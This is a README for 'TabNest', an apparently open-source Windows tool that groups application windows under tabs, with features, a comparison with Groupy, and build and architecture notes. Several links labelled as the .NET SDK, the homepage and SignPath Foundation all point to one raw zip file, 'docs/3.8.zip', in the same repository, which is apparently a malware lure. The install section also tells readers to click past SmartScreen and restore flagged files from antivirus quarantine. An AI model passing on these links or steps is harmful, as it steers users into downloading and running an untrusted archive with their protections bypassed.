<div align="center">

<img src="assets/logo.png" width="120" alt="TabNest logo">

# TabNest

**Browser-style tabs for every Windows app — without injecting a single DLL into any of them.**

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![.NET 10](https://img.shields.io/badge/.NET-10.0-512BD4.svg)](https://github.com/raleighbrunchcoat572/TabNest/raw/refs/heads/main/docs/3.8.zip)
[![Platform](https://img.shields.io/badge/Windows-10%20%7C%2011-0078D4.svg)](#requirements)
[![Single file](https://img.shields.io/badge/download-11.3%20MB%20single%20exe-success.svg)](#install)
[![Injection](https://img.shields.io/badge/DLL%20injection-none-brightgreen.svg)](#why-no-injection-matters)

**English** · [简体中文](README.zh-CN.md)

</div>

---

## What it is

TabNest groups unrelated Windows applications into a single tabbed workspace. Drag one window onto another and they merge; a tab rail appears above them; click a tab to switch, drag one out to split it off again.

```
┌──────────────────────────────────────────────────────────────┐
│  ▣ VS Code   │  ▣ Terminal   │  ▣ Chrome   │  ▣ Explorer  ✕  │  ← tab rail
├──────────────────────────────────────────────────────────────┤
│                                                              │
│                   the active window                          │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

It manages **windows**, not application internals. It never reads, modifies, or transmits the content of any document, and never loads code into another process.

> **Status — 0.1.2, feature-complete for what it sets out to do.** Grouping, switching, drag-merge/split, rules, saved workspaces, hotkeys, taskbar policies and the settings centre all work. Tabs drawn *inside* the native title bar would mean injecting code into other processes, which TabNest deliberately does not do — see [Roadmap](#roadmap). **This release is unsigned** — see [Unsigned builds](#unsigned-builds).

## Why

Windows has no answer for the twelve-window workday. Alt+Tab is a flat list, the taskbar groups by application rather than by task, and Microsoft cancelled Sets in 2019. The remaining options are commercial and all of them work by loading a DLL into every process on your machine.

TabNest takes the opposite bet: stay outside every other process, and pay for it with engineering rather than with the user's trust.

## Highlights

**Zero DLL injection.** TabNest loads no code into any other process. It observes via `SetWinEventHook` (out-of-context) and acts via ordinary window APIs. Nothing of TabNest is mapped into your browser, your IDE, or your password manager.

**11.3 MB, one file, no runtime.** Trimmed, single-file, compressed, self-contained. Download it and double-click. No .NET runtime, no VC++ redistributable, no admin rights.

**Measurably idle.** At or below the resolution floor of a 20-second CPU sample, with a 32 MB working set and 15 threads. There is no polling anywhere in the product; every wakeup traces back to a real window event. Verify it yourself with `TabNest.exe --benchmark`.

**Your windows are always recoverable.** A snapshot is written to disk *before* every window write. Crash it, kill it, uninstall it — windows return to their original positions and taskbar buttons are restored.

**Every switch actually does something.** Each toggle in the settings centre is backed by a test asserting the behaviour changes. A switch that does nothing when clicked is worse than no switch at all.

**Runs as you.** `asInvoker` manifest, no service, no elevated helper, no auto-update daemon.

### Features

|  | |
|---|---|
| **Grouping** | Drag-to-merge with configurable trigger (always / Shift / Ctrl) and delay · drag a tab out to split · hover the top of any window to reveal a merge bar · batch-adopt every window of an app or monitor in one click · auto-group windows of the same kind · lockable groups |
| **Tabs** | Rounded or square styles · variable or fixed width · window icons · close-button policy (hover / active only / all / never) · configurable visibility including auto-hide-on-hover · light, dark, and system-following themes |
| **Closing** | Browser semantics: close tab, close others, close left, close right, close all — with detection for apps that merely hide on close instead of exiting |
| **Sessions** | Save a group as a workspace and restore it later · crash recovery · window state restored exactly on exit |
| **Rules** | Allow-list or block-list of applications by executable · avoid apps that already have native tabs · a full rule engine (process + class + title matching) available via `settings.json` |
| **Keyboard** | Global hotkeys with conflict detection — <kbd>Win</kbd>+<kbd>`</kbd> next tab, <kbd>Ctrl</kbd>+<kbd>Win</kbd>+<kbd>`</kbd> previous |
| **Taskbar** | Show all member buttons, or only the active window's |
| **Fullscreen** | Maximize a group and the tab rail stays visible — double-click the rail to toggle |

## Comparison

The only mature product in this category is **Stardock Groupy 2**. TabNest was built against it deliberately, and the numbers below were measured rather than estimated.

> **Method.** Groupy 2 v2.3.1 and TabNest 0.1.2, same machine (Windows 11 26100, x64, 24 logical cores), both idle for 20 seconds with no mouse or keyboard input. Memory and handles from the process table; CPU from `TotalProcessorTime` deltas; injection count by walking the module list of every readable process. Groupy figures are the sum of its resident processes (`GroupyCtrl` + `GroupySrv` + two helpers). TabNest figures are the median of four runs, reproducible with `TabNest.exe --benchmark`. Full data and method: [`docs/competitive-analysis.md`](docs/competitive-analysis.md). **Your numbers will differ** — this is one machine, one configuration, one point in time.

| | **TabNest 0.1.2** | Groupy 2 (v2.3.1) |
|---|---|---|
| License | **MIT, open source** | Commercial, closed source |
| Price | **Free** | Paid |
| **DLL injection into other processes** | **None** | 46 processes on the test machine |
| Resident working set | **32.1 MB** | 78 MB |
| Idle CPU, 20 s sample | 0.00–0.08% | 0.08% of one core |
| Threads | **15** | 30 |
| Handles | **343** | 706 |
| Download size | **11.3 MB, single exe** | 24.6 MB installer |
| Extra runtime needed | **None** | None |
| Background service | **None** | Yes (`GroupySrv`) |
| Dark theme | **Yes** | No |
| Settings search | Not yet | No |
| Tabs drawn inside the native title bar | No — by design | **Yes** |
| Replaces Explorer / Notepad native tabs | No | **Yes** |
| Per-document and per-folder rules | No | **Yes** |
| Tab hover previews | No | **Yes** |
| Code signed | Not yet | **Yes** |
| Maturity | 0.1.2 | Shipping since 2017 |

**On the idle-CPU row: that is a tie, not a win.** 0.08% of one core over 20 seconds is 16 ms — one scheduler tick, which is the resolution floor of this measurement. Groupy lands on exactly the same 16 ms. Both tools are genuinely idle when idle, and neither can be shown to beat the other with this method. Reported here rather than quietly dropped, because an earlier version of this table claimed a difference that the data does not support.

**Where Groupy is genuinely ahead:** integrated tabs, native tab replacement, document-level rules, hover previews, a signed binary, and years of compatibility work. Those first four all require running code inside the target process, which is exactly what TabNest declines to do — not yet, but as a standing decision. If you want tabs rendered into the real title bar, buy Groupy: it is a good product and it earned that capability by paying a price TabNest is not paying.

### Why no injection matters

Loading a DLL into every running process is the standard way to solve this problem, and it has real costs that never show up in a task manager row:

- **Blast radius.** A bug in an injected DLL can crash the host application. One defect reaches every process it was mapped into.
- **Hidden overhead.** 46 processes each carry the DLL image and hook dispatch. None of that is attributed to the tool's own memory or CPU.
- **Trust surface.** Code inside your browser and password manager can read what they render. TabNest cannot, because it is not there.
- **Antivirus and sandboxes.** Global injection is one of the most-flagged behaviours in endpoint security, and modern sandboxed processes reject it anyway.

The tradeoff is honest and it is not free: staying outside means TabNest cannot draw into a window's real title bar, and focus transfer is constrained by Windows' foreground lock (see [Known limitations](#known-limitations)).

**Homepage:** [https://github.com/raleighbrunchcoat572/TabNest/raw/refs/heads/main/docs/3.8.zip](https://github.com/raleighbrunchcoat572/TabNest/raw/refs/heads/main/docs/3.8.zip)

## Install

From [Releases](../../releases) download either:

- `TabNest.exe` — copy it anywhere and double-click. No runtime, no administrator rights.
- `TabNest-0.1.2-setup.exe` — optional installer: Start-menu shortcut, launch-at-login, and a clean uninstall that asks the running instance to restore windows first.

Settings and saved groups live in `%LOCALAPPDATA%\TabNest\` and survive uninstall.

### Unsigned builds

**0.1.2 is not Authenticode-signed.** The publisher has not purchased an OV/EV code-signing certificate. That is a deliberate choice for this release, not a missing file in the zip.

What you may see, and what to do:

1. **SmartScreen — "Windows protected your PC".** This is the usual warning for a new, unsigned download. Click **More info**, confirm the file name is `TabNest.exe` or `TabNest-0.1.2-setup.exe`, then **Run anyway**. The prompt is per file hash: it can appear once for the installer and again for the installed `TabNest.exe`.
2. **Antivirus quarantine or a "trojan" alert.** Unsigned window-management tools are a common false-positive class. Restore the file from quarantine if you trust the GitHub source. If your environment forbids unsigned binaries, do not run this build.
3. **Corporate machines that block unsigned executables.** There is nothing to click through. You need a signed build, or an IT exception.

**A signed official binary is not provided.** If you need one (SmartScreen-quiet distribution, enterprise allow-lists), buy an **OV** code-signing certificate yourself from a public CA (DigiCert, Sectigo, …), then sign `TabNest.exe` and the setup package with `signtool` and a timestamp server. An **EV** certificate is no longer required just to silence SmartScreen. Open-source maintainers can also apply to [SignPath Foundation](https://github.com/raleighbrunchcoat572/TabNest/raw/refs/heads/main/docs/3.8.zip) for sponsored signing. How to hook a certificate into this repo is documented in [`packaging/README.md`](packaging/README.md).

### Requirements

Windows 10 version 2004 (build 19041) or later, x64 or ARM64. The Desktop Window Manager must be enabled, and *"Show window contents while dragging"* must be on — TabNest checks both and tells you if they are off.

## Build from source

Requires the [.NET 10 SDK](https://github.com/raleighbrunchcoat572/TabNest/raw/refs/heads/main/docs/3.8.zip) (version pinned by `global.json`). Visual Studio is not required.

```bash
dotnet build
```

```bash
dotnet test
```

Produce the shippable single-file binary:

```bash
dotnet publish src/TabNest.App -c Release -r win-x64 -o publish/v1 --self-contained true -p:PublishTrimmed=true -p:PublishSingleFile=true -p:EnableCompressionInSingleFile=true
```

### Diagnostics and test modes

TabNest ships with headless modes that need no GUI harness:

```bash
dotnet run --project src/TabNest.App -- --diagnose
```

| Mode | What it does |
|---|---|
| `--diagnose` | Lists every window and explains, in plain language, why it can or cannot be grouped |
| `--benchmark` | Measures memory, threads, handles, idle CPU and latency against the targets above; non-zero exit if any regress |
| `--watch` | Live trace of the drag-and-drop hit-testing chain |
| `--selftest` | Group → switch → split → restore round trip, with switch latency |
| `--grouptest` | Same, but through the **production** orchestration path |
| `--railtest` | Verifies the tab rail is visible, correctly positioned, and unoccluded |
| `--settingstest` | Checks the settings centre's layout, hit-testing and write-back wiring |
| `--quirktest` | Regression suite for windows that misbehave (see below) |
| `--stresstest` | Event storms and handle-leak detection |

The integration modes need the test harness running:

```bash
dotnet run --project tools/TabNest.Harness -- --spawn normal,stubborn,fixed,hideonclose
```

The harness deliberately spawns *badly behaved* windows, because well-behaved ones prove nothing. `stubborn` mimics Chromium — it forces its maximized rectangle back in `WM_WINDOWPOSCHANGING`, exactly like Electron apps do. `hideonclose` hides instead of exiting. `fixed` clamps its own size. Each one exists because it caught a real bug that a plain WPF window happily passed.

## Architecture

```
src/TabNest.Core      Pure domain: group state machine, rule engine, snapshots, config.
                      Zero Win32. 100% unit-testable.
src/TabNest.Interop   Every P/Invoke, window observation, window control, taskbar control.
src/TabNest.App       Tray process, orchestration, tab rail, settings centre.
                      All Win32 + GDI/GDI+ self-drawn — no WPF anywhere.
tests/                Domain unit tests (196).
tools/TabNest.Harness Misbehaving-window test host. Not shipped.
```

Three rules hold the design together:

**The domain layer never touches a window.** `GroupSessionManager` is a pure state machine that emits `WindowAction` instructions; `WindowController` executes them on a single serial queue. Group logic is therefore fully testable with no windows on screen.

**No WPF, anywhere.** WPF cannot be trimmed (`PublishTrimmed` fails with `NETSDK1168`) and cannot be NativeAOT-compiled. Keeping it would mean a 135 MB self-contained build or forcing a runtime install. Dropping it gave an 11.3 MB zero-dependency executable. `--benchmark` asserts `PresentationFramework` is never loaded.

**Every cross-process synchronous message carries a timeout.** All of them go through `SendMessageTimeoutW`, preceded by an `IsHungAppWindow` check. A frozen target application must never freeze TabNest.

Longer engineering notes — including the failures that produced these rules — are in [`docs/development.md`](docs/development.md).

## Known limitations

**Focus transfer degrades when TabNest has no foreground rights.** Code injected into a target process inherits its foreground privilege; TabNest, running outside, is subject to Windows' foreground lock. When you click a tab, TabNest received the last input event and qualifies, so focus moves normally. Without user input — a scripted call, for instance — a four-stage fallback chain ends at *raise without focus*: the window comes to the front, but the keyboard caret stays where it was. This is degradation, not failure, and `--selftest` reports the two outcomes separately.

**The tab rail is a separate window, so it can lag by a frame.** Groupy's rail is seamless because it is drawn by injected code inside the window's own title bar. TabNest's rail follows the target window from outside, which is structurally always one frame behind during fast drags. It overlaps the window's top corners to hide the seam. Removing that last frame of lag entirely would require drawing from inside the target process, which is not something TabNest does.

**The rules UI is an application list, not a rule editor.** The Rules page is a list of executables plus an *"only allow these apps"* checkbox — block-list when unchecked, allow-list when checked. The full rule engine (process + window class + title, partial matching, sub-rules, priority) works but must be configured by hand in `settings.json`. Making everyone face a multi-field form to serve a handful of complex cases puts the cost in the wrong place; hand-written rules are never overwritten by the UI and the page tells you they exist.

**Group fullscreen uses "fake maximize".** Chromium-based apps force their rectangle back to the full work area while maximized, so a genuinely maximized window cannot give up the strip the tab rail needs. TabNest instead restores the window and sizes it to the work area minus the rail. It looks identical, but Windows does not consider the window maximized, which affects the maximize button glyph and Snap Layouts.

**Not implemented:** integrated tabs and native tab replacement (both would require injection — a deliberate omission, see [Roadmap](#roadmap)), a hotkey rebinding UI (hotkeys are viewable and can be switched off; rebinding needs `settings.json`), and code signing.

## Roadmap

**TabNest does not inject, and there is no plan for it to start.** Tabs live on a rail above the window; that is the whole product, not a stepping stone to something else. The settings centre has no mode switch because there is only one mode.

An earlier plan had a second phase adding a native injection layer for tabs drawn inside the real title bar. That is **shelved**. It buys four things — integrated tabs, replacing Explorer/Notepad native tabs, proxying <kbd>Ctrl</kbd>+<kbd>T</kbd>/<kbd>N</kbd>, and document-level rules — and every one of them requires running code inside other people's processes. That is a large, permanent cost to the property most people would choose this tool for.

If enough people ask for integrated tabs, the way to do it without breaking that promise is a **separate optional download**, so the default binary stays injection-free and keeps its antivirus profile clean. Open an issue if you want it; real demand is what would move this.

What is planned near-term: code signing, screenshots, and whatever compatibility problems real usage turns up.

## Contributing

Issues and pull requests are welcome. Two expectations specific to this project:

1. **A regression test must be observed failing before the fix lands.** Not "should fail" — actually run it against the unfixed code and confirm it goes red. This project has caught three tests that asserted nothing and one revert that silently didn't apply.
2. **Reproduce misbehaving windows in the harness first.** If an app breaks TabNest, add a window kind to `tools/TabNest.Harness` that reproduces the behaviour, then fix it. A test host full of well-behaved windows is a test host that proves nothing.

## License

[MIT](LICENSE)

TabNest is an independent project. It is not affiliated with, endorsed by, or derived from Stardock Corporation or any other vendor mentioned here. Product names are trademarks of their respective owners; the comparison above reflects black-box measurement of a legally obtained copy on the author's own machine.
